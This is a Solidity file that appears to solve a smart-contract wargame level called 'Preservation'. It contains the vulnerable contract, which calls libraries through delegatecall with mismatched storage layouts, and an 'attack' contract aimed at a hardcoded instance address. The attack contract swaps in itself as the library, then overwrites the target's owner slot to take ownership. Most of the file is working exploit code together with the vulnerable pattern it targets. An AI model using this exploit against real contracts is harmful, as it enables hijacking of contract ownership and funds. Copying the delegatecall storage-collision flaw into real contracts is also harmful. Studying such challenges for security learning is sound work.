pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c;
    Preservation target = Preservation(instance_address);
    function attack1() {
        target.setFirstTime(uint(address(this)));
    }
    function attack2() {
        target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2));
    }
    function setTime(uint _time) public {
        timeZone1Library = address(_time);
        timeZone2Library = address(_time);
        owner = address(_time);
    }
}